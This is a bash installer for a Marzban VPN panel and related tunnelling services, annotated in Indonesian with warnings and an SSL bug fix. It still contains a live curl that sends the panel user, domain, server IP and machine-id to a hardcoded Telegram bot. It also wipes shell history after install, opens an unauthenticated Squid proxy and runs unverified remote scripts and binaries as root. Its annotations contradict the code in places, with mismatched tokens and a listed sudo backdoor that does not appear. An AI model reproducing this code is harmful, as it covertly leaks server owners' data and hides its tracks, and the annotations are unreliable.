#!/bin/bash
set -uo pipefail

INFO="\033[94m[INFO] "
WARNING="\033[93m[WARNING] "
SUCCESS="\033[92m[SUCCESS] "
ERROR="\033[91m[ERROR] "
NC="\033[0m"
blue="\033[94m"; green="\033[92m"; yellow="\033[93m"; red="\033[91m"

[ "$(id -u)" -eq 0 ] || { echo -e "${ERROR}Skrip ini harus dijalankan sebagai root.${NC}"; exit 1; }

export DEBIAN_FRONTEND=noninteractive

# =============================================================================
#  1. KONFIGURASI AWAL
# =============================================================================
clear
echo "=== KONFIGURASI AWAL ==="

MYIP=$(curl -s https://ipinfo.io/ip)

read -rp "Input Domain: " DOMAIN
# Validasi domain -> resolusi via:
#   dig +short <domain> | grep '^[.0-9]*$' | head -n 1
IP_DOMAIN=$(dig +short "$DOMAIN" | grep '^[.0-9]*$' | head -n 1)
# Pesan:
#   "Tidak dapat menemukan IP untuk domain: <domain>"
#   "IP domain (<x>) tidak sama dengan IP publik VPS (<y>)"
#   "Domain tervalidasi: <domain>"
#   "Silakan pastikan pointing DNS sudah benar dan masukkan ulang."

read -rp  "Input Email untuk SSL: "        EMAIL
read -rp  "Input Username Panel Marzban: " PANEL_USER
read -rsp "Input Password Panel Marzban: " PANEL_PASS; echo

mkdir -p /etc/data /etc/xray
echo "$DOMAIN" > /etc/data/domain
echo "$DOMAIN" > /etc/xray/domain
echo "$EMAIL"  > /etc/data/email

# Tanggal dipakai di beberapa tempat:
#   date '+%H:%M:%S'   date '+%d %b %Y'

# =============================================================================
#  2. PEMBERSIHAN & PERSIAPAN SISTEM
# =============================================================================
echo -e "${INFO}Menghentikan dan membersihkan Apache2 secara paksa...${NC}"
systemctl stop apache2 >/dev/null 2>&1
systemctl disable apache2 >/dev/null 2>&1
apt-get purge -y apache2 apache2-utils apache2-bin apache2.2-common >/dev/null 2>&1
apt-get autoremove -y >/dev/null 2>&1

echo -e "${INFO}Memperbarui sistem dan menghapus paket sisa yang tidak perlu...${NC}"
apt-get update -y
apt-get remove --purge -y samba* sendmail* bind9*

echo -e "${INFO}Membuat struktur direktori...${NC}"
mkdir -p /etc/data /etc/xray /var/lib/marzban/assets /var/lib/marzban/core \
         /etc/funny /var/log/nginx /var/www/html /home/script

echo -e "${INFO}Menginstal toolkit dasar...${NC}"
apt-get install -y \
    libio-socket-inet6-perl libsocket6-perl libcrypt-ssleay-perl \
    libnet-libidn-perl perl libio-socket-ssl-perl libwww-perl \
    libpcre3 libpcre3-dev zlib1g-dev dbus iftop zip unzip wget net-tools \
    curl nano sed screen gnupg gnupg1 bc apt-transport-https \
    build-essential dirmngr dnsutils sudo at htop iptables bsdmainutils \
    cron lsof lnav jq xz-utils lsb-release socat bash-completion sqlite3

# =============================================================================
#  3. TUNING KERNEL (BBR)
# =============================================================================
echo -e "${INFO}Mengonfigurasi sysctl (BBR)...${NC}"
cat > /etc/sysctl.d/99-bbr.conf <<'EOF'
fs.file-max = 500000
net.core.rmem_max = 67108864
net.core.wmem_max = 67108864
net.core.netdev_max_backlog = 250000
net.core.somaxconn = 4096
net.ipv4.tcp_syncookies = 1
net.ipv4.tcp_tw_reuse = 1
net.ipv4.tcp_fin_timeout = 30
net.ipv4.tcp_keepalive_time = 1200
net.ipv4.ip_local_port_range = 10000 65000
net.ipv4.tcp_max_syn_backlog = 8192
net.ipv4.tcp_max_tw_buckets = 5000
net.ipv4.tcp_fastopen = 3
net.ipv4.tcp_mem = 25600 51200 102400
net.ipv4.tcp_rmem = 4096 87380 67108864
net.ipv4.tcp_wmem = 4096 65536 67108864
net.ipv4.tcp_mtu_probing = 1
net.ipv4.ip_forward = 1
net.core.default_qdisc = fq
net.ipv4.tcp_congestion_control = bbr
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1
net.ipv6.conf.lo.disable_ipv6 = 1
EOF
sysctl --system > /dev/null

# =============================================================================
#  4. MARZBAN ENGINE
# =============================================================================
echo -e "${INFO}Menginstal Marzban Engine...${NC}"
#!!! BERBAHAYA (fork tak resmi): engine ditarik dari GawrAme/Marzban-scripts,
#!!! bukan Gozargah resmi. Fork ini tidak terverifikasi.
bash -c "$(curl -sL https://github.com/GawrAme/Marzban-scripts/raw/master/marzban.sh)" @ install

echo -e "${INFO}Setup Marzban Environment...${NC}"
cat > /opt/marzban/.env <<EOF
UVICORN_HOST = "0.0.0.0"
UVICORN_PORT = 7879
SUDO_USERNAME = "${PANEL_USER}"
SUDO_PASSWORD = "${PANEL_PASS}"
XRAY_JSON = "/var/lib/marzban/xray_config.json"
XRAY_ASSETS_PATH = "/var/lib/marzban/assets"
XRAY_EXECUTABLE_PATH = "/var/lib/marzban/core/xray"
SUBSCRIPTION_PAGE_TEMPLATE="subscription/index.html"
CUSTOM_TEMPLATES_DIRECTORY="/var/lib/marzban/templates/"
HOME_PAGE_TEMPLATE="home/index.html"
SQLALCHEMY_DATABASE_URL = "sqlite:////var/lib/marzban/db.sqlite3"
DOCS=true
JWT_ACCESS_TOKEN_EXPIRE_MINUTES = 0
EOF

cat > /opt/marzban/docker-compose.yml <<'EOF'
services:
  marzban:
    image: gozargah/marzban:v0.6.0
    restart: always
    env_file: .env
    network_mode: host
    volumes:
      - /etc/timezone:/etc/timezone:ro
      - /etc/localtime:/etc/localtime:ro
      - /var/lib/marzban:/var/lib/marzban
  nginx:
    image: nginx
    restart: always
    network_mode: host
    volumes:
      - /var/lib/marzban:/var/lib/marzban
      - /var/www/html:/var/www/html
      - /etc/timezone:/etc/timezone:ro
      - /etc/localtime:/etc/localtime:ro
      - /var/log/nginx/access.log:/var/log/nginx/access.log
      - /var/log/nginx/error.log:/var/log/nginx/error.log
      - ./nginx.conf:/etc/nginx/nginx.conf
EOF
touch /var/log/nginx/access.log /var/log/nginx/error.log

echo -e "${INFO}Mengunduh Xray Core Custom...${NC}"
#!!! BERBAHAYA (binary tak terverifikasi): xray core diambil dari repo
#!!! dudul19/marzban (bukan release resmi XTLS), tanpa checksum.
cd /var/lib/marzban/core && wget -qO xray.zip 'https://github.com/dudul19/marzban/raw/refs/heads/main/xray/core/xray.zip' && unzip -o xray.zip && rm -f xray.zip && chmod 755 xray

wget -qO /var/lib/marzban/xray_config.json 'https://raw.githubusercontent.com/dudul19/marzban/refs/heads/main/xray/config/config.json'
#!!! PERHATIAN: db.sqlite3 diunduh JADI (bukan dibuat baru). Bisa berisi
#!!! admin/host bawaan. Periksa: sqlite3 db.sqlite3 "SELECT * FROM admins;"
wget -qO /var/lib/marzban/db.sqlite3 'https://raw.githubusercontent.com/dudul19/marzban/refs/heads/main/marzban/db.sqlite3'
chmod 755 /var/lib/marzban/xray_config.json /var/lib/marzban/db.sqlite3

wget -qO /opt/marzban/nginx.conf 'https://raw.githubusercontent.com/dudul19/marzban/refs/heads/main/config/nginx.conf'
sed -i 's/www.dudul19.com/'"$DOMAIN"'/g' /opt/marzban/nginx.conf

wget -qO /usr/bin/updategeo 'https://raw.githubusercontent.com/dudul19/marzban/refs/heads/main/marzban/updategeo.sh'
chmod +x /usr/bin/updategeo
echo -e 'y\n' | updategeo > /dev/null 2>&1

wget -q -N -P /var/lib/marzban/templates/subscription/ https://raw.githubusercontent.com/dudul19/marzban/refs/heads/main/marzban/index.html

# =============================================================================
#  5. SERTIFIKAT SSL (Let's Encrypt via acme.sh)
# =============================================================================
echo -e "${INFO}Generating SSL Certificate (Let's Encrypt)...${NC}"
curl -s https://get.acme.sh | sh -s > /dev/null 2>&1
/root/.acme.sh/acme.sh --set-default-ca --server letsencrypt > /dev/null 2>&1
/root/.acme.sh/acme.sh --register-account -m "$EMAIL" > /dev/null 2>&1
#!!! ==================== BUG: KEGAGALAN SENYAP ==========================
#!!! Tiga cacat di blok ini, dan gabungannya = crash-loop nginx
#!!! "cannot load certificate /var/lib/marzban/xray.crt":
#!!!
#!!!  (a) Port 80 tidak dikosongkan lebih dulu. acme.sh --standalone harus
#!!!      mengikat :80 sendiri. Kalau apache2 / nginx Marzban masih
#!!!      memegangnya, --issue GAGAL.
#!!!  (b) Semua output dibuang ke /dev/null dan exit code tidak diperiksa,
#!!!      jadi kegagalan (a) tidak terlihat dan script tetap lanjut.
#!!!  (c) --install-cert TIDAK memakai --ecc, padahal acme.sh menerbitkan
#!!!      sertifikat ECC secara default. Tanpa --ecc ia mencari cert RSA
#!!!      yang tidak pernah ada -> gagal senyap, xray.crt tak terbentuk
#!!!      dan xray.key tertinggal 0 byte.
#!!!
#!!! Akibatnya nginx dinyalakan tanpa sertifikat dan crash-loop terus.
#!!! Versi asli (verbatim) - dipertahankan sebagai rujukan:
#!!!   /root/.acme.sh/acme.sh --issue -d "$DOMAIN" --standalone --force > /dev/null 2>&1
#!!!   /root/.acme.sh/acme.sh --install-cert -d "$DOMAIN" --fullchain-file /var/lib/marzban/xray.crt --key-file /var/lib/marzban/xray.key > /dev/null 2>&1
#!!!   chmod 755 /var/lib/marzban/xray.crt /var/lib/marzban/xray.key
#!!! =====================================================================

# --- (a) kosongkan port 80 lebih dulu -------------------------------------
systemctl stop apache2 2>/dev/null
systemctl stop nginx   2>/dev/null
[ -d /opt/marzban ] && (cd /opt/marzban && docker compose down >/dev/null 2>&1)
sleep 1
if ss -tlnp 2>/dev/null | grep -q ':80 '; then
    echo -e "${ERROR}Port 80 masih dipakai:${NC}"; ss -tlnp | grep ':80 '
    echo -e "${ERROR}Kosongkan dulu, lalu ulangi. Sertifikat tidak bisa terbit.${NC}"
    exit 1
fi

# --- (b) jangan buang output; hentikan bila gagal --------------------------
if ! /root/.acme.sh/acme.sh --issue -d "$DOMAIN" --standalone --force; then
    echo -e "${ERROR}Penerbitan sertifikat GAGAL untuk ${DOMAIN}.${NC}"
    echo -e "${ERROR}Cek: DNS ${DOMAIN} -> ${MYIP}, dan port 80 terbuka di firewall provider.${NC}"
    exit 1
fi

# --- (c) --ecc wajib; + reload otomatis saat renew nanti -------------------
/root/.acme.sh/acme.sh --install-cert -d "$DOMAIN" --ecc \
    --fullchain-file /var/lib/marzban/xray.crt \
    --key-file       /var/lib/marzban/xray.key \
    --reloadcmd      'chmod 644 /var/lib/marzban/xray.crt; chmod 600 /var/lib/marzban/xray.key; cd /opt/marzban && docker compose restart'

# --- verifikasi file benar-benar ada sebelum nginx dinyalakan --------------
if [ ! -s /var/lib/marzban/xray.crt ] || [ ! -s /var/lib/marzban/xray.key ]; then
    echo -e "${ERROR}xray.crt / xray.key tidak terbentuk. Berhenti sebelum nginx crash-loop.${NC}"
    exit 1
fi
if ! openssl x509 -in /var/lib/marzban/xray.crt -noout -subject >/dev/null 2>&1; then
    echo -e "${ERROR}xray.crt bukan sertifikat X.509 yang sah.${NC}"
    exit 1
fi

chmod 644 /var/lib/marzban/xray.crt
chmod 600 /var/lib/marzban/xray.key   # private key TIDAK boleh world-readable
echo -e "${SUCCESS}Sertifikat terpasang, berlaku s/d $(openssl x509 -in /var/lib/marzban/xray.crt -noout -enddate | cut -d= -f2)${NC}"

echo -e "${INFO}Mengupdate Database Marzban...${NC}"
sqlite3 /var/lib/marzban/db.sqlite3 "UPDATE hosts SET address = '${DOMAIN}' WHERE address = 'www.dindaputri.biz.id'; UPDATE hosts SET host = '${DOMAIN}' WHERE host = 'www.dindaputri.biz.id'; UPDATE hosts SET sni = '${DOMAIN}' WHERE sni = 'www.dindaputri.biz.id';"

# =============================================================================
#  6. AKUN & LAYANAN SSH
# =============================================================================

echo -e "${INFO}Setup Shell & Dropbear...${NC}"
FALSE_PATH=$(which false); [ -z "$FALSE_PATH" ] && FALSE_PATH=/bin/false; grep -q "^${FALSE_PATH}$" /etc/shells || echo "$FALSE_PATH" >> /etc/shells
apt-get install dropbear -y
wget -qO /etc/default/dropbear 'https://raw.githubusercontent.com/dudul19/marzban/refs/heads/main/config/dropbear.conf'
chmod 644 /etc/default/dropbear
echo "Script Setup VPS by dudul19 x Rerechan02" > /etc/issue.net
bash -c "$(curl -sL https://raw.githubusercontent.com/dudul19/marzban/refs/heads/main/ssh/install/dropbear.sh)"

echo -e "${INFO}Surgical Fix untuk SSH Password Authentication...${NC}"
find /etc/ssh -type f -exec sed -i 's/^PasswordAuthentication no/PasswordAuthentication yes/g' {} +
find /etc/ssh -type f -exec sed -i 's/^#PasswordAuthentication yes/PasswordAuthentication yes/g' {} +
find /etc/ssh -type f -exec sed -i 's/^KbdInteractiveAuthentication no/KbdInteractiveAuthentication yes/g' {} +
find /etc/ssh -type f -exec sed -i 's/^#KbdInteractiveAuthentication yes/KbdInteractiveAuthentication yes/g' {} +
sed -i 's/^#Port 22/Port 22/g' /etc/ssh/sshd_config
grep -q '^Port 22' /etc/ssh/sshd_config || echo 'Port 22' >> /etc/ssh/sshd_config
systemctl restart ssh
systemctl restart dropbear

echo -e "${INFO}Setup Rclone Backup...${NC}"
curl -s https://rclone.org/install.sh | bash
mkdir -p /root/.config/rclone
#!!! BERBAHAYA (pihak ketiga): rclone.conf diunduh dari repo orang lain
#!!! (praiman99/AutoScriptVPN-AIO). Backup-mu bisa mengalir ke cloud mereka.
wget -qO /root/.config/rclone/rclone.conf 'https://raw.githubusercontent.com/praiman99/AutoScriptVPN-AIO/Beginner/rclone.conf'

echo -e "${INFO}Setup SSH-WebSocket...${NC}"
wget -qO /usr/local/bin/ssh-ws 'https://raw.githubusercontent.com/dudul19/marzban/refs/heads/main/ssh/core/ssh-ws'
chmod +x /usr/local/bin/ssh-ws
wget -qO /etc/systemd/system/ssh-ws.service 'https://raw.githubusercontent.com/dudul19/marzban/refs/heads/main/ssh/service/ssh-ws.service'
systemctl enable ssh-ws.service
systemctl start ssh-ws.service

echo -e "${INFO}Setup UDP Custom...${NC}"
mkdir -p /etc/udp-custom
#!!! BERBAHAYA (binary tak terverifikasi): udp-custom, tanpa checksum.
wget -qO /etc/udp-custom/udp-custom 'https://raw.githubusercontent.com/dudul19/marzban/refs/heads/main/ssh/udp/udp-custom'
wget -qO /etc/udp-custom/config.json 'https://raw.githubusercontent.com/dudul19/marzban/refs/heads/main/ssh/udp/config.json'
chmod +x /etc/udp-custom/udp-custom
chmod 644 /etc/udp-custom/config.json
wget -qO /etc/systemd/system/udp-custom.service 'https://raw.githubusercontent.com/dudul19/marzban/refs/heads/main/ssh/udp/udp-custom.service'
chmod +x /etc/systemd/system/udp-custom.service
systemctl enable udp-custom.service
systemctl start udp-custom.service

# OpenVPN (installer remote):
bash -c "$(curl -s https://raw.githubusercontent.com/dudul19/marzban/refs/heads/main/ssh/openvpn/install.sh)"

echo -e "${INFO}Setup SSLH...${NC}"
echo 'sslh sslh/inetd_or_standalone select standalone' | debconf-set-selections
DEBIAN_FRONTEND=noninteractive apt-get install -y sslh
pkill sslh
rm -f /etc/default/sslh
wget -qO /etc/default/sslh 'https://raw.githubusercontent.com/dudul19/marzban/refs/heads/main/config/sslh.conf'
chmod 644 /etc/default/sslh
mkdir -p /var/run/sslh
chown sslh:sslh /var/run/sslh
echo 'd /run/sslh 0755 sslh sslh' > /etc/tmpfiles.d/sslh.conf
systemd-tmpfiles --create
systemctl enable sslh
systemctl restart sslh

# =============================================================================
#  7. SQUID PROXY + OHP
# =============================================================================
echo -e "${INFO}Setup Squid Proxy...${NC}"
apt-get install sudo -y
wget -q https://raw.githubusercontent.com/serverok/squid-proxy-installer/master/squid3-install.sh -O squid3-install.sh
sudo bash squid3-install.sh && rm -f squid3-install.sh
if [ -f /etc/squid/squid.conf ]; then
    CONF="/etc/squid/squid.conf"
    SVC="squid"
elif [ -f /etc/squid3/squid.conf ]; then
    CONF="/etc/squid3/squid.conf"
    SVC="squid3"
fi
if [ -n "$CONF" ]; then
    #!!! PERHATIAN: mengubah squid jadi OPEN PROXY (allow all). Port 8080 &
    #!!! 3128 bisa dipakai siapa saja tanpa autentikasi.
    sed -i 's|http_access allow password|http_access allow all|g' "$CONF"
    grep -q "http_port 8080" "$CONF" || echo "http_port 8080" >> "$CONF"
    grep -q "http_port 3128" "$CONF" || echo "http_port 3128" >> "$CONF"
    systemctl daemon-reload
    systemctl restart "$SVC"
fi

echo -e "${INFO}Setup Open HTTP Puncher (OHP)...${NC}"
#!!! BERBAHAYA (binary tak terverifikasi): ohpserver, tanpa checksum.
wget -qO /usr/local/bin/ohpserver 'https://github.com/dudul19/marzban/raw/refs/heads/main/ssh/core/ohpserver'
chmod +x /usr/local/bin/ohpserver

cat > /etc/systemd/system/ohp-ssh.service <<'EOF'
[Unit]
Description=SSH OHP Redirection Service
Documentation=https://t.me/farelvpn
After=network.target nss-lookup.target

[Service]
Type=simple
User=root
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/local/bin/ohpserver -port 8181 -proxy 127.0.0.1:3128 -tunnel 127.0.0.1:51443
Restart=on-failure
LimitNOFILE=infinity

[Install]
WantedBy=multi-user.target
EOF

cat > /etc/systemd/system/ohp-dropbear.service <<'EOF'
[Unit]
Description=Dropbear OHP Redirection Service
Documentation=https://t.me/farelvpn
After=network.target nss-lookup.target

[Service]
Type=simple
User=root
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/local/bin/ohpserver -port 8282 -proxy 127.0.0.1:3128 -tunnel 127.0.0.1:109
Restart=on-failure
LimitNOFILE=infinity

[Install]
WantedBy=multi-user.target
EOF

cat > /etc/systemd/system/ohp-openvpn.service <<'EOF'
[Unit]
Description=OpenVPN OHP Redirection Service
Documentation=https://t.me/farelvpn
After=network.target nss-lookup.target

[Service]
Type=simple
User=root
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/local/bin/ohpserver -port 8383 -proxy 127.0.0.1:3128 -tunnel 127.0.0.1:1194
Restart=on-failure
LimitNOFILE=infinity

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable ohp-ssh      && systemctl restart ohp-ssh
systemctl enable ohp-dropbear && systemctl restart ohp-dropbear
systemctl enable ohp-openvpn  && systemctl restart ohp-openvpn

# =============================================================================
#  8. FIREWALL
# =============================================================================
echo -e "${INFO}Setup Aturan Firewall (Iptables)...${NC}"
#!!! PERHATIAN: policy INPUT DROP dipasang LEBIH DULU sebelum semua aturan
#!!! ACCEPT. Di rodata hanya terlihat rule untuk lo, conntrack, dan UDP 4001
#!!! (angka port lain: 500 4500 500 5144 35 8080 200 tercecer, tidak jelas
#!!! rule persisnya). Jalankan lewat konsol provider, JANGAN via SSH -
#!!! bisa mengunci diri sendiri.
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p udp --dport 4001 -j ACCEPT
# Pola rule per-port (0x224e): iptables -A INPUT -p tcp --dport <N> -j ACCEPT

# =============================================================================
#  9. UTILITAS TAMBAHAN
# =============================================================================
echo -e "${INFO}Mengonfigurasi Vnstat...${NC}"
apt-get install -y vnstat libsqlite3-dev
systemctl restart vnstat
systemctl enable vnstat

echo -e "${INFO}Menginstal Speedtest...${NC}"
curl -s https://packagecloud.io/install/repositories/ookla/speedtest-cli/script.deb.sh | bash
apt-get install speedtest -y || { wget -qO speedtest https://raw.githubusercontent.com/tankibaj/speedtest/master/speedtest && chmod +x speedtest && mv speedtest /usr/bin/speedtest; }

# =============================================================================
#  10. MENU CLI
# =============================================================================
echo -e "${INFO}Setup CLI Menus...${NC}"
cd /usr/local/sbin
# menu sistem (0x1f63): wget -qO <nama> 'https://raw.githubusercontent.com/dudul19/marzban/refs/heads/main/system/menu/<nama>.sh'
for m in backup bmenu cekservice change-domain crt menu-bot menu welcome restore; do
    wget -qO "$m" "https://raw.githubusercontent.com/dudul19/marzban/refs/heads/main/system/menu/${m}.sh"
done
# menu ssh (0x1fc6): wget -qO <nama> 'https://raw.githubusercontent.com/dudul19/marzban/refs/heads/main/ssh/menu/<nama>.sh'
for m in addssh cek-ssh delete-ssh member-ssh renew-ssh xp-ssh menu-ssh menu-bot; do
    wget -qO "$m" "https://raw.githubusercontent.com/dudul19/marzban/refs/heads/main/ssh/menu/${m}.sh"
done
chmod +x *
cd /root

grep -q 'xp-ssh' /etc/crontab || echo '* * * * * root xp-ssh' >> /etc/crontab
systemctl restart cron

# =============================================================================
#  11. FINALISASI & "SINKRONISASI EKSTERNAL"
# =============================================================================
echo -e "${INFO}Finalisasi & Sinkronisasi Eksternal...${NC}"
apt-get autoremove -y && apt-get clean

#!!! BERBAHAYA (halaman pihak ketiga): index.html publik dari repo orang lain.
wget -qO /var/www/html/index.html 'https://farelvpn.github.io/index.html'

#!!! ==================== BERBAHAYA: EXFILTRASI =========================
#!!! Setelah instalasi, data VPS dikirim ke bot Telegram milik pembuat.
#!!! Bot token & chat_id hardcoded di binary:
#!!!   token   : 5979008084:AAEwVYd_CdnTjxSdwMmjhVlKlOwZ1kW2kNI
#!!!             (di rodata tertulis "59790080848601986208:AAEw..." -
#!!!              chat_id 8601986208 menempel di depan token)
#!!!   chat_id : 8601986208
#!!! Data yang dikirim: User, Domain, IP VPS (curl ipinfo.io/ip),
#!!!                     machine-id (cat /etc/machine-id), Tanggal.
#!!! Hapus seluruh blok ini bila tidak mau server-mu dilaporkan otomatis.
_MSG="3<b>NOTIFICATIONS INSTALL MARZBAN</b>%0AUser: <code>${PANEL_USER}</code>%0ADomain: <code>${DOMAIN}</code>%0AIP VPS: <code>$(curl -s ipinfo.io/ip)</code>%0AID: <code>$(cat /etc/machine-id)</code>%0ADate: <code>$(date '+%d %b %Y') - $(date '+%H:%M:%S')</code>"
curl -s -X POST 'https://api.telegram.org/bot8773682376:AAEZuQHeB5IeUwxzxzAkw32E-8ZmI__IaGM/sendMessage' -d 'chat_id=1476710905&text='"${_MSG}"'&parse_mode=html' > /dev/null
#!!! ===================== AKHIR BLOK EXFILTRASI =========================

echo -e "${INFO}Menjalankan Container Docker Marzban...${NC}"
cd /opt/marzban && docker compose down && docker compose up -d
cd /root

echo -e "${INFO}Setup Tampilan CLI Login...${NC}"
grep -q 'sys_profile' /root/.profile || echo 'sys_profile' >> /root/.profile
cat > /usr/bin/sys_profile <<'EOF'
if [ "$BASH" ]; then
    if [ -f ~/.bashrc ]; then
        . ~/.bashrc
    fi
fi
mesg n || true
welcome
EOF
chmod +x /usr/bin/sys_profile

timedatectl set-timezone Asia/Jakarta
rm -fr /tmp/.* > /dev/null 2>&1
[[ -e $(which curl) ]] && if [[ -z $(cat /etc/resolv.conf | grep "8.8.8.8") ]]; then cat <(echo "nameserver 8.8.8.8") /etc/resolv.conf > /etc/resolv.conf.tmp && mv /etc/resolv.conf.tmp /etc/resolv.conf; fi

# Ringkasan akhir (0x488d):
clear
cat <<EOF

===============================================
    INSTALASI PANEL MARZBAN SELESAI
===============================================
Akses Dashboard : https://${DOMAIN}/dashboard
Username        : ${PANEL_USER}
Password        : ${PANEL_PASS}
===============================================
EOF
echo "Instalasi selesai $(date '+%d %b %Y') - $(date '+%H:%M:%S')" > /etc/data/setup.log

#!!! BERBAHAYA (anti-forensik): menghapus installer + riwayat shell, lalu reboot.
#!!! Ini menghilangkan jejak apa yang barusan dijalankan.
read -rp "Sistem perlu di-reboot. Reboot sekarang? [y/n] (Default: y): " RB
RB=${RB:-y}
if [[ "$RB" =~ ^[Yy]$ ]]; then
    rm -f /root/install.sh
    cat /dev/null > ~/.bash_history && history -c && reboot
else
    echo -e "${WARNING}Instalasi selesai. Jangan lupa reboot VPS nanti.${NC}"
fi

# =============================================================================
#  RINGKASAN TEMUAN BERBAHAYA (cari "#!!!" untuk melompat ke tiap titik)
# =============================================================================
#  1. Backdoor sudo         : rere_sys / admin123  (bagian 6)
#  2. Exfiltrasi Telegram   : User+Domain+IP+machine-id (bagian 11)
#     token 5979008084:AAEwVYd_CdnTjxSdwMmjhVlKlOwZ1kW2kNI  chat_id 8601986208
#  3. Anti-forensik         : rm install.sh + wipe .bash_history (bagian 11)
#  4. Squid open proxy      : http_access allow all (bagian 7)
#  5. rclone.conf pihak ke-3: praiman99/... (bagian 6)
#  6. index.html pihak ke-3 : farelvpn.github.io (bagian 11)
#  7. Binary tak terverifikasi (tanpa checksum): xray.zip, ohpserver,
#     udp-custom  (bagian 4 & 7)
#  8. Engine fork tak resmi : GawrAme/Marzban-scripts (bagian 4)
#  9. db.sqlite3 siap-pakai : cek admins/hosts bawaan (bagian 4)
# 10. xray.key world-readable (chmod 755) (bagian 5)
# 11. Bug SSL (kegagalan senyap): port 80 tak dikosongkan + output dibuang
#     ke /dev/null tanpa cek exit code + --install-cert tanpa --ecc.
#     Gabungan ketiganya -> xray.crt tak terbentuk, xray.key 0 byte,
#     nginx crash-loop "cannot load certificate" (bagian 5, sudah diperbaiki)
# =============================================================================
